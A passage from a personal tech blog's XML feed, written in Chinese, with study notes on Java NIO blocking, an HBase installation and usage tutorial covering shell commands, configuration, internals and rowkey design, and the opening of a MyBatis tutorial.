title="五、阻塞和非阻塞（重点！！）"></a>五、阻塞和非阻塞（重点！！）</h2><p>这里所说的阻塞和非阻塞主要针对网络编程。在客户端连接服务器时，客户端要向服务器发送数据包请求，双方都会打开一个通道，但是当服务器读取一段数据后，不清楚客户端通道中的数据是否读取完，则这个线程会被阻塞。</p><p>而非阻塞网络IO就是在客户端和服务器之间加一个选择器（Selector），所有客户端发送过来的数据包都先通过选择器，由选择器来判断该数据包是否准备完毕，将准备完毕的数据包发送给服务器去处理，而没准备完毕的数据包留在这里。</p><p><img src="/images/%E9%9D%9E%E9%98%BB%E5%A1%9E%E6%A8%A1%E5%BC%8F.png"></p><p>因此，使用NIO完成网络通信的三个核心：</p><ul><li>Channel，负责连接</li><li>Buffer，负责传输数据</li><li>Selector，是SelectableChannel的多路复用器，用于监控SelectableChannel的IO状况。</li></ul><p>这部分笔者还不是很清楚。</p><h2 id="六、NIO实战项目"><a href="#六、NIO实战项目" class="headerlink" title="六、NIO实战项目"></a>六、NIO实战项目</h2><p>用NIO写一个非阻塞式http服务器：<a href="https://github.com/yury757/httpserver">yury757/httpserver (github.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、NIO和IO的区别&quot;&gt;&lt;a href=&quot;#一、NIO和IO的区别&quot; class=&quot;headerlink&quot; title=&quot;一、NIO和IO的区别&quot;&gt;&lt;/a&gt;一、NIO和IO的区别&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;传统IO面向流，而NIO面向管道（channel）</summary>
      
    
    
    
    <category term="java" scheme="https://yury757.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://yury757.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>hbase-study</title>
    <link href="https://yury757.github.io/bigdata/hbase/HBase-study"/>
    <id>https://yury757.github.io/bigdata/hbase/HBase-study</id>
    <published>2021-08-23T16:00:00.000Z</published>
    <updated>2021-10-31T18:41:45.121Z</updated>
    
    <content type="html"><![CDATA[<p>Linux：ubuntu18.04.5</p><p>hbase：2.3.5</p><p>官方文档：<a href="http://hbase.apache.org/book.html">Apache HBase ™ Reference Guide</a></p><h2 id="一、HBase介绍"><a href="#一、HBase介绍" class="headerlink" title="一、HBase介绍"></a>一、HBase介绍</h2><h3 id="1、Hadoop的局限性"><a href="#1、Hadoop的局限性" class="headerlink" title="1、Hadoop的局限性"></a>1、Hadoop的局限性</h3><ul><li>hadoop主要是实现批量数据的处理，并通过顺序方式访问数据。比如批量处理一天的数据。</li><li>要查找数据必须搜索整个数据集，即不具备随即读取数据的能力。</li></ul><h3 id="2、HBase简介"><a href="#2、HBase简介" class="headerlink" title="2、HBase简介"></a>2、HBase简介</h3><ul><li>HBase是一个分布式的、<strong>面向列</strong>的开源数据库，该技术来源于Fay Chang所撰写的Google论文《Bigtable：一个结构化数据的分布式存储系统》。</li><li>HBase一开始是Hadoop下的一个子项目，因为也是基于HDFS文件系统的，后成为Apache的顶级项目。</li><li>HBase是Google Bigtable的开源实现，类似Google Bigtable利用GFS作为其文件存储系统，HBase利用<strong>Hadoop HDFS</strong>作为其文件存储系统；Google运行MapReduce来处理Bigtable中的海量数据，HBase同样利用Hadoop MapReduce来处理HBase中的海量数据；Google Bigtable利用 Chubby作为协同服务，HBase利用Zookeeper作为对应。</li><li>HBase是一种NoSQL数据库，仅能通过主键（row key）和主键的range来检索数据，对事务的支持较弱。</li><li><strong>HBase只支持一种数据类型：byte[]</strong></li><li>HBase是稀疏存储的，即为空的字段不占用空间，而比如MySQL的null实际上也会占空间的。</li><li><font color="Red">应用场景：需要存储海量数据，又要快速的写入和查询数据的场景。</font></li></ul><h3 id="3、关系型数据库（RDBMS）和HBase的比较"><a href="#3、关系型数据库（RDBMS）和HBase的比较" class="headerlink" title="3、关系型数据库（RDBMS）和HBase的比较"></a>3、关系型数据库（RDBMS）和HBase的比较</h3><table><thead><tr><th></th><th>关系型数据库（以MySQL为例）</th><th>HBase</th></tr></thead><tbody><tr><td>是否以表的形式存在</td><td>是</td><td>是</td></tr><tr><td>支持的文件系统</td><td>FAT（windows旧）、NTFS（windows新）、EXT（Linux）</td><td>HDFS文件系统</td></tr><tr><td>物理上的存储方式</td><td>以行的形式存储，每个字段之间用分隔符隔开</td><td>以每个单元格为一行的形式存储，即每一个单元格数据都会存储其row key、列簇名、列名和时间戳等。HBase会对行进行分割，一片行和一个列簇即形成一个region。具体见后面详解。</td></tr><tr><td>索引</td><td>支持主键（primary key）和二级索引</td><td>仅支持主键（row key）</td></tr><tr><td>事务</td><td>最常用的InnoDB引擎的事务处理满足ACID原则</td><td>对事务的支持较弱，不支持ACID</td></tr><tr><td>是否能使用sql查询</td><td>能</td><td>不能，NoSQL数据库</td></tr><tr><td>是否支持join</td><td>支持</td><td>不支持</td></tr><tr><td>适合存储的数据</td><td>适合存储少量的、结构化的数据</td><td>适合存储大量数据，结构化和非结构话都适合，但是如果使用HBase来存储少量数据，效率和内存消耗上都不如关系型数据库</td></tr></tbody></table><h3 id="4、HBase的逻辑结构"><a href="#4、HBase的逻辑结构" class="headerlink" title="4、HBase的逻辑结构"></a>4、HBase的逻辑结构</h3><p><img src="/images/HBase%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84.png"></p><h3 id="5、HBase的物理结构"><a href="#5、HBase的物理结构" class="headerlink" title="5、HBase的物理结构"></a>5、HBase的物理结构</h3><p>HBase的物理结构，实际上是每一个单元都对应了一行或多行数据，每行存储了其元数据信息和值。</p><p><font color="Red">而实际上删除操作的第一时间并不会真正删除数据，而是插入了一条type为delete的数据，timestamp则是版本控制（这就是为什么需要校正服务器时间），查数据get命令其实就是获取timestamp最大的那条数据，如果这条数据的type是delete，则不反悔数据，否则返回那条数据。而scan命令可以通过设置VERSION参数来查看之前版本的数据。</font></p><p><img src="/images/HBase%E7%89%A9%E7%90%86%E7%BB%93%E6%9E%84.png"></p><h3 id="6、Hive和HBase的区别"><a href="#6、Hive和HBase的区别" class="headerlink" title="6、Hive和HBase的区别"></a>6、Hive和HBase的区别</h3><table><thead><tr><th></th><th>Hive</th><th>HBase</th></tr></thead><tbody><tr><td>定位</td><td>Hive是一个数据仓库工具，本质相当于把HDFS中已存在的数据文件在MySQL中做一个映射关系，以方便用HQL去管理查询。</td><td>定位是一个NoSQL数据库</td></tr><tr><td>功能</td><td>用于数据分析和清洗</td><td>高效地存储和查询数据</td></tr><tr><td>使用场景</td><td>离线数据分析和清晰，因为需要时间较长，延迟较高</td><td>实时查询和存储海量数据</td></tr><tr><td>底层</td><td>基于HDFS，编写的HQL最终是转换为MapReduce代码执行</td><td>基于HDFS，但是在HDFS上做了进一步的处理和优化</td></tr></tbody></table><p>如下面是一种数据仓库架构。</p><p><img src="/images/%E5%A4%A7%E5%9E%8B%E4%BC%81%E4%B8%9A%E7%9A%84%E4%B8%80%E7%A7%8D%E6%95%B0%E6%8D%AE%E4%BB%93%E5%BA%93%E6%9E%B6%E6%9E%84.png"></p><h2 id="二、下载、安装和配置"><a href="#二、下载、安装和配置" class="headerlink" title="二、下载、安装和配置"></a>二、下载、安装和配置</h2><p>下载链接：<a href="https://mirrors.tuna.tsinghua.edu.cn/apache/hbase/">HBase的清华大学镜像包</a></p><p>选择一个稳定版本，点进去后下载其中的二进制的压缩包，不用下载源码的压缩包，源码的压缩包可以用来看源码。</p><pre><code class="shell"># 下载wget https://mirrors.tuna.tsinghua.edu.cn/apache/hbase/stable/hbase-2.3.5-bin.tar.gz# 解压tar xzvf hbase-2.3.5-bin.tar.gz# 以这个目录为工作目录cd hbase-2.3.5</code></pre><p>配置环境变量</p><pre><code class="shell">vi /etc/profile# 在最下面添加export HBASE_HOME=/home/yury/hbase-2.3.5export PATH=$&#123;PATH&#125;:$&#123;HBASE_HOME&#125;/bin:$&#123;HBASE_HOME&#125;/sbin# 加载环境变量source /etc/profile</code></pre><p>修改配置文件<code>./conf/hbase-env.sh</code></p><pre><code class="shell"># 修改压缩包根目录下的这个文件vi ./conf/hbase-env.sh# 添加JAVA_HOME配置export JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64/# 为false时使用自己的ZOOKEEPER，即需要自己启动zookeeper服务。为true时使用hbase内置的zookeeper，如果是单机版建议为true，或者不配置export HBASE_MANAGES_ZK=false</code></pre><p>将一个包复制到lib目录下</p><pre><code class="shell">cp lib/client-facing-thirdparty/htrace-core4-4.2.0-incubating.jar ./lib/</code></pre><p>移除一个日志jar包，这个版本和hadoop的3.3.0版本的日志包会有冲突</p><pre><code class="shell">rm lib/client-facing-thirdparty/slf4j-log4j12-1.7.30.jar</code></pre><h2 id="三、单机版"><a href="#三、单机版" class="headerlink" title="三、单机版"></a>三、单机版</h2><pre><code class="shell"># 配置完了以上操作后，直接启动即可./bin/start-hbase.sh# 返回结果如下# running master, logging to /home/yury/hbase-2.3.5/bin/../logs/hbase-yury-master-myubuntu1.out# 可以在http://192.168.141.141:16010这个页面中HBase的web管理页面# jps命令可以看到有一个HMaster进程jps# 2032 Jps# 1539 HMaster</code></pre><h2 id="四、初步使用HBase的shell"><a href="#四、初步使用HBase的shell" class="headerlink" title="四、初步使用HBase的shell"></a>四、初步使用HBase的shell</h2><p>hbase的数据库结构主要以下层次：</p><ul><li>namespace（命名空间，相当于MySQL的schema）</li><li>table</li><li>column family（列簇）</li><li>column qualifier（列名）</li></ul><p>hbase的namespace默认有两个：default和namespace，默认使用default，即在创建表时如果没有加命名空间前缀，则默认往default命名空间里面建表。</p><p>而namespace这个命名空间存储着数据库的元数据信息，这个命名空间向相当于MySQL的information这个schema。</p><p><font color="Red">hbase shell里面没有分号，如果敲了分号并回车了，可以通过敲一个单引号，再回车，再敲一个单引号来取消之前的命令。</font></p><p><font color="Red">对于哪个命令不熟悉，可以<code>help &#39;create&#39;</code>，就有这个命令的使用方法，下面只是简单介绍。</font></p><pre><code class="shell"># 启动hbase的shell命令，需要配置hbase环境变量，以下都是hbase的shell命令hbase shell</code></pre><h3 id="1、命名空间操作"><a href="#1、命名空间操作" class="headerlink" title="1、命名空间操作"></a>1、命名空间操作</h3><pre><code class="shell">list_namespace                # 展示所有命名空间create_namespace &#39;myns&#39;       # 创建命名空间，相当于MySQL的创建一个schemadrop_namespace &#39;myns&#39;         # 删除命名空间describe_namespace &#39;myns&#39;     # 查看指定命名空间的详细信息list_namespace_tables &#39;myns&#39;  # 查看指定命名空间下的所有表</code></pre><h3 id="2、表操作"><a href="#2、表操作" class="headerlink" title="2、表操作"></a>2、表操作</h3><pre><code class="shell"># 对于表的操作默认是指default命名空间，要想对其他命名空间操作表，需加命名空间的前缀，如下# 在myns命名空间下创建一个表create &#39;myns:myns_test&#39;, &#39;myns_cf&#39;# 以下不加前缀则都是在default命名空间下操作create &#39;test&#39;, &#39;cf&#39;                              # 一个列簇cfcreate &#39;test2&#39;, &#39;cf1&#39;, &#39;cf2&#39;                     # 两个列簇cf1和cf2list &#39;test&#39;                                      # 确认表是否存在describe &#39;test&#39;                                  # 查看表结构disable &#39;test&#39;                                   # 使表失效enable &#39;test&#39;                                    # 使表生效alter &#39;test&#39;, &#123;NAME=&gt;&#39;cf1&#39;, VERSION=&gt;3&#125;          # 修改表的元数据信息drop &#39;test&#39;                                      # 删除表，删除之前要disable这个表scan &#39;test&#39;, &#123;STARTROW=&gt;&#39;1001&#39;, STOPROW=&gt;&#39;1003&#39;&#125; # 扫描查看&#39;test&#39;表的所有数据</code></pre><h3 id="3、数据操作"><a href="#3、数据操作" class="headerlink" title="3、数据操作"></a>3、数据操作</h3><pre><code class="shell"># 插入数据# 参数1：命名空间+表名# 参数2：行号，row key# 参数3：列名全限定名，即列簇名+列名# 参数4：值put &#39;&#123;namespace&#125;:&#123;tablename&#125;&#39;, &#39;&#123;row key&#125;&#39;, &#39;&#123;column family&#125;:&#123;column qualifier&#125;&#39;, &#39;&#123;value&#125;&#39;, &#39;&#123;timestamp&#125;&#39;, &#39;&#123;其他属性&#125;&#39;put &#39;test&#39;, &#39;row1&#39;, &#39;cf:a&#39;, &#39;value1&#39;put &#39;test&#39;, &#39;row2&#39;, &#39;cf:b&#39;, &#39;value2&#39;put &#39;test&#39;, &#39;row3&#39;, &#39;cf:c&#39;, &#39;value3&#39;# 根据表名和row key获取值get &#39;&#123;namespace&#125;:&#123;tablename&#125;&#39;, &#39;&#123;row key&#125;&#39;, &#39;&#123;column family&#125;:&#123;column qualifier&#125;&#39;get &#39;test&#39;, &#39;row1&#39;# 结果如下# COLUMN            CELL#  cf:a             timestamp=2021-05-01T17:46:15.064, value=value1# 根据表名、row key和列删除数据，一个单元格delete &#39;&#123;namespace&#125;:&#123;tablename&#125;&#39;, &#39;&#123;row key&#125;&#39;, &#39;&#123;column family&#125;:&#123;column qualifier&#125;&#39;# 根据表名、row key删除数据，row key对应的一整行deleteall &#39;&#123;namespace&#125;:&#123;tablename&#125;&#39;, &#39;&#123;row key&#125;&#39;# 清空表truncate &#39;&#123;namespace&#125;:&#123;tablename&#125;&#39;</code></pre><h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a><font color="Red">注意：</font></h3><ul><li><p>row key为字符串类型，其排序是按照字符串的大小排序，如’10010’ &gt; ‘1001’。</p></li><li><p>get命令的列参数哪里如果没有冒号，则这个参数是指column family而不是column qualifier。</p></li><li><p>scan命令如果有STARTROW和STOPROW参数，则筛选范围为左闭右开！</p></li><li><p>数据的改操作没有update命令，其实直接put进去一个值，就会自动完成改操作，有点类似于hashmap直接put后会覆盖原来的值这种。</p></li><li><p>创建表和列簇时的VERSION属性表示这个这个列簇最终将会存几个版本的数据，如VERSION=2，则取数据时设置VERSION=3也只能拿到两条数据，并且在hbase空间时，除最新的两个版本的数据会被保留外，其余版本数据都会从磁盘中删除。</p></li></ul><h2 id="五、分布式部署"><a href="#五、分布式部署" class="headerlink" title="五、分布式部署"></a>五、分布式部署</h2><h3 id="1、伪分布式"><a href="#1、伪分布式" class="headerlink" title="1、伪分布式"></a>1、伪分布式</h3><p><strong>伪分布式：在同一个服务器中部署，但是HMaster，HRegionServer和ZooKeeper服务在不同的JVM进程中。</strong></p><p>前提：先启动zookeeper服务（可以单机模式），再启动hadoop服务（至少伪分布式），最后才能启动hbase</p><p>配置/conf/hbase-site.xml</p><pre><code class="shell">vi /conf/hbase-site.xml</code></pre><pre><code class="xml">&lt;!-- 为true则是分布式的，为false则是单机版 --&gt;&lt;property&gt;  &lt;name&gt;hbase.cluster.distributed&lt;/name&gt;  &lt;value&gt;true&lt;/value&gt;&lt;/property&gt;&lt;!-- 这个是指数据的根目录在哪里，可以指定hdfs文件系统，即在hadoop的etc/hadoop/core-site.xml中配置的fs.defaultFS --&gt;&lt;property&gt;  &lt;name&gt;hbase.rootdir&lt;/name&gt;  &lt;value&gt;hdfs://localhost:9000/hbase&lt;/value&gt;&lt;/property&gt;&lt;!-- 官网文档说还要删除hbase.tmp.dir配置和hbase.unsafe.stream.capability.enforce配置 --&gt;</code></pre><p>启动</p><pre><code class="shell"># 启动hbasebin/start-hbase.sh# 在hadoop中校验是否在hdfs文件系统中创建了一个hbase的文件夹bin/hadoop fs -ls /hbase# zookeeper、hadoop和hbase全部启动成功后，运行jps命令结果应该是这样的。如果没有jps命令，linux会提示你安装一个jdk的东西jps6976 DataNode           # hadoop6787 NameNode           # hadoop6531 QuorumPeerMain     # zookeeper7237 SecondaryNameNode  # hadoop7941 Jps                # jps7592 HMaster            # hbase7786 HRegionServer      # hbase</code></pre><h3 id="2、完全分布式"><a href="#2、完全分布式" class="headerlink" title="2、完全分布式"></a>2、完全分布式</h3><p><code>hbase-site.xml</code>配置文件</p><pre><code class="xml">&lt;property&gt;  &lt;name&gt;hbase.cluster.distributed&lt;/name&gt;  &lt;value&gt;false&lt;/value&gt;&lt;/property&gt;&lt;property&gt;  &lt;name&gt;hbase.tmp.dir&lt;/name&gt;  &lt;value&gt;./tmp&lt;/value&gt;&lt;/property&gt;&lt;property&gt;  &lt;name&gt;hbase.unsafe.stream.capability.enforce&lt;/name&gt;  &lt;value&gt;false&lt;/value&gt;&lt;/property&gt;&lt;property&gt;  &lt;name&gt;hbase.rootdir&lt;/name&gt;  &lt;value&gt;hdfs://192.168.0.201:9000/hbase&lt;/value&gt;&lt;/property&gt;&lt;property&gt;  &lt;name&gt;hbase.zookeeper.quorum&lt;/name&gt;  &lt;value&gt;192.168.0.201,192.168.0.202,192.168.0.203&lt;/value&gt;&lt;/property&gt;&lt;property&gt;  &lt;name&gt;hbase.zookeeper.property.dataDir&lt;/name&gt;  &lt;value&gt;/home/yury/zookeeper-3.6.3/zookeeper-data/hbase&lt;/value&gt;&lt;/property&gt;</code></pre><h3 id="3、注意点"><a href="#3、注意点" class="headerlink" title="3、注意点"></a>3、注意点</h3><p>1、各个服务器之间的时间必须要同步，不然会出现不可预知的错误</p><h2 id="六、HBase进阶"><a href="#六、HBase进阶" class="headerlink" title="六、HBase进阶"></a>六、HBase进阶</h2><h3 id="1、HBase架构"><a href="#1、HBase架构" class="headerlink" title="1、HBase架构"></a>1、HBase架构</h3><p>HMaster负责DDL操作，而HRegionServer负责DML操作，而实际操作中都会有zookeeper，zookeeper则是负责调度HRegionServer，因此当HMaster挂了，并不影响DML操作，只是不能进行DDL操作。</p><p>HLog类似于MySQL的Binlog，防止数据库奔溃时数据丢失。</p><p><img src="/images/HBase%E6%9E%B6%E6%9E%84.png"></p><h3 id="2、写数据流程"><a href="#2、写数据流程" class="headerlink" title="2、写数据流程"></a>2、写数据流程</h3><ul><li>收到put请求：put table/rowkey/cf/column value</li><li>前往meta-region-server这个服务器，请求查询该表的meta表所在RegioinServer</li><li>前往meta表所在服务器，请求查询该表和列簇所在的RegioinServer</li><li>将该put请求发送给对应的服务器</li></ul><p><img src="/images/HBase%E5%86%99%E6%95%B0%E6%8D%AE%E6%B5%81%E7%A8%8B.png"></p><h3 id="3、MemStore-Flush"><a href="#3、MemStore-Flush" class="headerlink" title="3、MemStore Flush"></a>3、MemStore Flush</h3><p>即把内存中的数据刷新到HDFS中。</p><table><thead><tr><th>配置</th><th>解释</th></tr></thead><tbody><tr><td>hbase.regionserver.global.memstore.size</td><td>全局配置，一个regionserver中所有memstore之和的最大值，默认为堆内存的40%，当memstore超过这个值时，就会阻塞写数据操作</td></tr><tr><td>hbase.regionserver.global.memstore.size.lower.limit</td><td>全局配置，一个regionserver中所有memstore之和的最大值，默认为堆内存的40%*0.95=38%，当memstore超过这个值时，就会开始flush操作，此时还不会阻塞写数据操作</td></tr><tr><td>hbase.regionserver.optionalcacheflushinterval</td><td>内存中的最后一次编辑的数据文件在自动刷新前能够存活的最长时间，默认1小时，当某些数据超过这个时间时，即使memstore内存没达到flush阈值，也会进行flush</td></tr><tr><td>hbase.hregion.memstore.flush.size</td><td>单个region中memstore的缓存最大值，超过这个值时这个region就会进行flush，默认值为128M</td></tr></tbody></table><h3 id="4、读数据流程"><a href="#4、读数据流程" class="headerlink" title="4、读数据流程"></a>4、读数据流程</h3><ul><li>收到get请求</li><li>前往meta-region-server查询meta表所在的RegionServer</li><li>前往meta表所在服务器，请求查询该表和列簇所在的RegioinServer</li><li>同时读memstore（内存）和storefile（磁盘），将两份数据读进block cache，取时间戳最大的那条数据。</li></ul><p><img src="/images/HBase%E8%AF%BB%E6%95%B0%E6%8D%AE%E6%B5%81%E7%A8%8B.png"></p><h3 id="5、StoreFile-Compaction"><a href="#5、StoreFile-Compaction" class="headerlink" title="5、StoreFile Compaction"></a>5、StoreFile Compaction</h3><p>hdfs中的hfile文件的合并，<font color="Red">compaction操作是先全部读出来，再重新合并在一起。</font>有以下两种：</p><ul><li>Minor compaction：只选取一些小的文件进行合并，不会删除delete类型或时间戳更小的数据</li><li>Major compaction：将一个store下的所有hfile合并成一个大文件，对于相同rowkey且时间戳更小的数据会执行物理删除操作</li></ul><p>配置：</p><table><thead><tr><th>配置</th><th>解释</th></tr></thead><tbody><tr><td>hbase.hregion.majorcompaction</td><td>一个region进行自动major compaction的周期，默认为7天，即7天自动进行一次大合并。生产环境不建议开启（设置为0），因为很耗资源，而是手动进行major compaction</td></tr><tr><td>hbase.hregion.majorcompaction.jitter</td><td>抖动比例，不管，反正都会被关掉</td></tr><tr><td>hbase.hstore.compactionThreshold</td><td>一个store中允许存的hfile的最大值，超过或等于这个值，就会被合并到一个新的hfile中，默认值为3</td></tr></tbody></table><h3 id="6、真正删数据发生在什么时候"><a href="#6、真正删数据发生在什么时候" class="headerlink" title="6、真正删数据发生在什么时候"></a>6、真正删数据发生在什么时候</h3><ul><li>进行flush时，内存中版本更老的数据会被删除，即老版本数据不会被写入hfile中</li><li>进行major compaction时会将老版本数据删除</li></ul><h3 id="7、Region-Split"><a href="#7、Region-Split" class="headerlink" title="7、Region Split"></a>7、Region Split</h3><table><thead><tr><th>配置</th><th>解释</th></tr></thead><tbody><tr><td>hbase.hregion.max.filesize</td><td>一个region的最大大小。默认值为10G。</td></tr></tbody></table><p>当一个region中的某个store下的所有storefile总大小超过<code>Min(&quot;count of region&quot;^2*&quot;hbase.hregion.memstore.flush.size&quot;, &quot;hbase.hregion.max.filesize&quot;)</code>时，该region就会进行拆分。</p><p><strong>数据热点问题：</strong></p><p>第一个region的拆分的阈值为128M，拆分为两个，分别为64M</p><p>rowkey是自增的，在第二个region后面新增数据</p><p>第二个region的拆分的阈值为512M（2^2*128），拆分为两个，分别为256M</p><p>rowkey继续自增，在第三个region后面新增数据</p><p>第三个region的拆分阈值为1152M（3^2*128），拆分为两个，分别为576M</p><p>rowkey继续自增……</p><p>因此，这样的话第n个region的大小为：Min(n^2*64M, 5G)，即region在到达5G之前，各个regino的大小差异会比较大，即数据会集中在某几个region中，导致这几个region服务器压力很大。</p><p><strong>官方建议，使用更少的列簇，将更多的列放进同一个列簇中，而不是创建更多的列簇，因为多个列簇flush后容易形成多个小文件</strong></p><h2 id="七、优化"><a href="#七、优化" class="headerlink" title="七、优化"></a>七、优化</h2><h3 id="1、高可用"><a href="#1、高可用" class="headerlink" title="1、高可用"></a>1、高可用</h3><p>在创建conf/backup-master这个文件，在里面写入备份的master结点的服务器，当主节点挂了之后，会选举一个备份主节点来顶替主节点的位置</p><pre><code>192.168.141.142192.168.141.143</code></pre><h3 id="2、预分区"><a href="#2、预分区" class="headerlink" title="2、预分区"></a>2、预分区</h3><p>（1）手动设置预分区（更常用）</p><pre><code class="shell">create &quot;staff&quot;, &quot;info&quot;, &quot;partition&quot;, SPLITS =&gt; [&#39;1000&#39;, &#39;2000&#39;, &#39;3000&#39;, &#39;4000&#39;]</code></pre><p>（2）手动生成16进制预分区</p><pre><code class="shell">create &quot;staff2&quot;, &quot;info&quot;, &quot;partition2&quot;, &#123;NUMREGIONS =&gt; 15, SPLITALGO =&gt; &#39;HexStringSplit&#39;&#125;</code></pre><p>（3）按照文件中设置的分区规则预分区</p><pre><code class="shell"># 在hbase根目录下touch splits.txtaaaabbbbccccdddd</code></pre><pre><code class="shell">create &quot;staff3&quot;, &quot;info&quot;, &quot;partition3&quot;, SPLITS_FILE =&gt; &#39;splits.txt&#39;# 系统会给splits.txt这个文件进行排序</code></pre><p>（4）使用javaAPI创建分区</p><p>略</p><h3 id="3、rowkey的设计"><a href="#3、rowkey的设计" class="headerlink" title="3、rowkey的设计"></a>3、rowkey的设计</h3><p><font color="Red">rowkey要保持散列性（随机性，使其可以随机落在不同的region中）、唯一性、长度足够长等原则，最好是70-100位字母或数字。</font></p><p>如生成随机数、hash、散列值、字符串拼接。</p><h4 id="（1）案例1"><a href="#（1）案例1" class="headerlink" title="（1）案例1"></a>（1）案例1</h4><p>存储通话记录以及通话详情的rowkey设计。需存储的数据如下：</p><pre><code>phone_from   phone_to     time_start           duration13112345678  13187654321  2021-01-01 12:12:12  45</code></pre><p>首先根据业务对未来十年的数据的预期，需要设置300个分区，分区键分别是：</p><pre><code>000|001|002|...156|157|...298|</code></pre><p>我们将rowkey前三位作为分区号，那么为了保证随机性，我们如何将数据散列分布在这300个分区内呢？即我们如何设计rowkey以保证数据会随机分布在300个分区中？</p><p>此外根据业务需求，我们最好将同一拨出号码的同一个月份的通话记录放在一个分区内，以便以后做计算更快。</p><p>我们设计这样一个算法：</p><p>因此有300个分区，因此我们将rowkey的前三位作为分区号，从第4位开始，我们将拨出号码作为字符串拼接进去，再将通话开始时间拼接进去，以下划线分割，如下：</p><pre><code>xxx_13112345678_2021-01-01 12:12:12</code></pre><p>那么如何将这个rowkey随机分布到300个分区中且同一拨出号码同一月份的通话记录在同一分区呢？即rowkey前面的xxx要根据后面的13112345678_2021-01-01 12:12:12来区分。</p><ul><li>首先，不同的手机号可以随机区分开，因此可以用手机号进行hash，这样不同手机号的hashcode是随机分布的</li><li>其次，同一拨出号码的同一月份要放一起，因此可以将手机号+年月进行hash，这样同一手机号同一月份的hashcode是相同的</li><li>最后，我们只需要三位数字来存储分区号，因此我们可以通过获取hashcode除以299的余来获取分区号</li></ul><pre><code>分区号=(hash(13112345678_202101))%299</code></pre><p><font color="Red">技巧：我们对分区键的设计可以用一个常用符号中ascii序号最大的符号为结尾，如<code>|</code>，而rowkey中以一个ascii序号小点的符号为分隔符，如<code>_</code>。这样<code>000|</code>就会大于任意以<code>000_</code>开始的值。且我们在扫描表时，是左闭右开的原则，这样做对于rowkey的比较起来更方便，如下。</font></p><pre><code># 扫描001分区的数据STARTKEY =&gt; &#39;001&#39;, STOPKEY =&gt; &#39;001|&#39;# 扫描某拨出号码在4月份的数据STARTKEY =&gt; &#39;XXX_13112345678_202103&#39;, STOPKEY =&gt; &#39;XXX_13112345678_202103|&#39;# 其中xxx=(hash(13112345678_202103))%299</code></pre><h3 id="4、基础优化"><a href="#4、基础优化" class="headerlink" title="4、基础优化"></a>4、基础优化</h3><p>（1）允许在HDFS的文件中追加内容</p><p>hdfs-site.xml、hbase-site.xml</p><p>属性：dfs.support.append</p><p>解释：开启HDFS追加同步，可以优秀地配合HBase的数据同步和持久化。默认值为true。</p><p>（2）优化DataNode允许的最大文件打开数</p><p>hdfs-site.xml</p><p>属性：dfs.datanode.max.transfer.threads</p><p>解释：</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Linux：ubuntu18.04.5&lt;/p&gt;
&lt;p&gt;hbase：2.3.5&lt;/p&gt;
&lt;p&gt;官方文档：&lt;a href=&quot;http://hbase.apache.org/book.html&quot;&gt;Apache HBase ™ Reference Guide&lt;/a&gt;&lt;/p&gt;
&lt;h2</summary>
      
    
    
    
    <category term="bigdata" scheme="https://yury757.github.io/categories/bigdata/"/>
    
    <category term="hbase" scheme="https://yury757.github.io/categories/bigdata/hbase/"/>
    
    
  </entry>
  
  <entry>
    <title>mybatis-study</title>
    <link href="https://yury757.github.io/java/mybatis/mybatis-study"/>
    <id>https://yury757.github.io/java/mybatis/mybatis-study</id>
    <published>2021-08-23T16:00:00.000Z</published>
    <updated>2021-09-10T13:50:17.664Z</updated>
    
    <content type="html"><![CDATA[<p>练习用代码：<a href="https://github.com/yury757/Mybatis-Study">yury757/Mybatis-Study (github.com)</a></p><h2 id="一、Mybatis问题"><a href="#一、Mybatis问题" class="headerlink" title="一、Mybatis问题"></a>一、Mybatis问题</h2><p>Mybatis遇到的问题大部分有以下五类：</p><p>1、配置文件没有注册</p><p>2、绑定接口错误</p><p>3、方法名不对</p><p>4、返回类型不对</p><p>5、Maven导出资源问题</p><h2 id="二、Mybatis实现方式"><a href="#二、Mybatis实现方式" class="headerlink" title="二、Mybatis实现方式"></a>二、Mybatis实现方式</h2><ul><li>写一个实体类和对应的查询接口</li><li>本来我们应该手写实现这个查询接口的类，并在对应的方法里面写sql语句、使用SqlSession执行SQL语句，再把结果集强转成我们自己的实体类。</li><li>Mybatis则不需要我们手写这个实现类，而是弄了一个mapper的xml文件，里面定义了<strong>某个接口的某个方法的实现</strong>，我们只需要在xml中定义这个方法的SQL语句、参数类型、参数集、结果类型、结果集等标签。</li><li>再将对应的mapper注册到Mybatis的配置文件中。</li><li><strong>然后项目启动时，Mybatis框架去配置文件的注册中心中把注册过的类提前实现好，生成.class字节码文件（猜测）</strong>，我们只需要通过<code>getMapper(UserDao.class)</code>方法（这个方法里面肯定封装了newInstance或类似的方法）就可以拿到对应类的实例，然后直接调用相应的方法就行。而且会自动帮我们把结果集封装到mapper定义的结果类型中。</li></ul><h2 id="三、Mybatis中的三个核心类"><a href="#三、Mybatis中的三个核心类" class="headerlink" title="三、Mybatis中的三个核心类"></a>三、Mybatis中的三个核心类</h2><h3 id="（1）SqlSessionFactoryBuilder"><a href="#（1）SqlSessionFactoryBuilder" class="headerlink" title="（1）SqlSessionFactoryBuilder"></a>（1）SqlSessionFactoryBuilder</h3><p>这个类是<strong>用于创建SqlSessionFactory对象的</strong>，SqlSessionFactory对象一旦创建就不再需要SqlSessionFactoryBuilder了。</p><pre><code class="java">// 使用mybatis第一步，获取SqlSessionFactory对象static&#123;    String resource = &quot;mybatis-config.xml&quot;;    InputStream inputStream = null;    try &#123;        inputStream = Resources.getResourceAsStream(resource);    &#125; catch (IOException e) &#123;        e.printStackTrace();    &#125;    sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);&#125;</code></pre><h3 id="（2）SqlSessionFactory"><a href="#（2）SqlSessionFactory" class="headerlink" title="（2）SqlSessionFactory"></a>（2）SqlSessionFactory</h3><p>SqlSessionFactory一旦被创建，应该在程序运行期间一直存在，因为<strong>它是创建SqlSession对象的工厂</strong>。默认为单例模式。</p><h3 id="（3）SqlSession"><a href="#（3）SqlSession" class="headerlink" 